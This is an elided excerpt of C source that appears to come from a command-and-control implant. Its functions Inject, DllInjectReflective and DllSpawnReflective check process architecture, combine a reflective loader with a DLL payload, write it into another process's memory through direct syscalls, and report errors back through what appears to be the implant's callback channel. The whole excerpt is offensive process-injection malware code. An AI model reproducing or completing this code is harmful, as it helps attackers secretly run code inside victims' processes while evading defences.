...
DWORD Inject(
    ...
    if ( x64 && ((INSTANCE *)Instance)->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ) {
        PUTS( "The OS is x86!" )
    ...
    if ( x64 && IsWow64 ) {
        ...
        Status = INJECT_ERROR_PROCESS_ARCH_MISMATCH;
        goto END;
    } else if ( ! x64 && ((INSTANCE *)Instance)->Session.OS_Arch == PROCESSOR_ARCHITECTURE_AMD64 && ! IsWow64 ) {
...
DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    ...
    BOOL     x64                 = ((INSTANCE *)Instance)->Session.OS_Arch == PROCESSOR_ARCHITECTURE_INTEL ? FALSE : TRUE;
    ...
    if ( ( ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer ) ) ) {
        ...
        HasRDll     = FALSE;
        FullDll     = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, DllLdrSize + DllLength );
    ...
    if ( ParamSize > 0 )
    {
        ...
        if ( MemParamsBuffer )
        {
            ...
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                ...
                PackageTransmitError( CALLBACK_ERROR_WIN32, ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) );
    ...
    if ( MemLibraryBuffer )
    {
        ...
        if ( NT_SUCCESS( NtStatus = SysNtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
        {
            ...
            // NtStatus = ((INSTANCE *)Instance)->Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
        ...
        else
        {
            ...
            PackageTransmitError( 0x1, ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError( NtStatus ) );
            ReturnValue = NtStatus;
            goto Cleanup;
        }
    }
...
DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    ...
    if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
        SpawnProc = ((INSTANCE *)Instance)->Config.Process.Spawn86;
    else
        SpawnProc = ((INSTANCE *)Instance)->Config.Process.Spawn64;
